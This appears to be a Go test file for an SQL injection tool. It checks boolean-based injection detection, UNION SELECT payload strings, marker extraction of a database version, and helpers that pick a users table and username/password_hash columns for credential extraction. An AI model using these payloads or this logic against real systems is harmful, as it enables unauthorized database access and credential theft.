package sqli

import "testing"

func TestLooksInjectable(t *testing.T) {
	base := response{status: 200, body: "welcome user list item1 item2 item3"}
	truthy := response{status: 200, body: "welcome user list item1 item2 item3"}
	falsy := response{status: 200, body: "no results"}

	if !looksInjectable(base, truthy, falsy) {
		t.Fatalf("expected injectable when true mirrors base and false diverges")
	}

	stable := response{status: 200, body: "welcome user list item1 item2 item3"}
	if looksInjectable(base, truthy, stable) {
		t.Fatalf("expected not injectable when false matches base")
	}
}

func TestUnionPayload(t *testing.T) {
	stringCtx := contexts[0]
	if got := unionPayload("1", stringCtx, 3, 1, "'mark'"); got != "1' AND '1'='2' UNION SELECT NULL,'mark',NULL-- -" {
		t.Fatalf("string unionPayload = %q", got)
	}

	numericCtx := contexts[1]
	if got := unionPayload("7", numericCtx, 2, 0, "'mark'"); got != "7 AND 1=2 UNION SELECT 'mark',NULL-- -" {
		t.Fatalf("numeric unionPayload = %q", got)
	}
}

func TestBetween(t *testing.T) {
	if got := between("xxMARK8.0.32MARKyy", "MARK", "MARK"); got != "8.0.32" {
		t.Fatalf("between = %q, want 8.0.32", got)
	}

	if got := between("no markers", "MARK", "MARK"); got != "" {
		t.Fatalf("between = %q, want empty", got)
	}
}

func TestPickCredentialColumns(t *testing.T) {
	ident, secret := pickCredentialColumns("id,username,password_hash,created_at")

	if ident != "username" {
		t.Errorf("ident = %q, want username", ident)
	}

	if secret != "password_hash" {
		t.Errorf("secret = %q, want password_hash", secret)
	}
}

func TestPickCredentialTable(t *testing.T) {
	if got := pickCredentialTable("products,users,orders"); got != "users" {
		t.Fatalf("pickCredentialTable = %q, want users", got)
	}

	if got := pickCredentialTable("products,orders"); got != "" {
		t.Fatalf("pickCredentialTable = %q, want empty", got)
	}
}
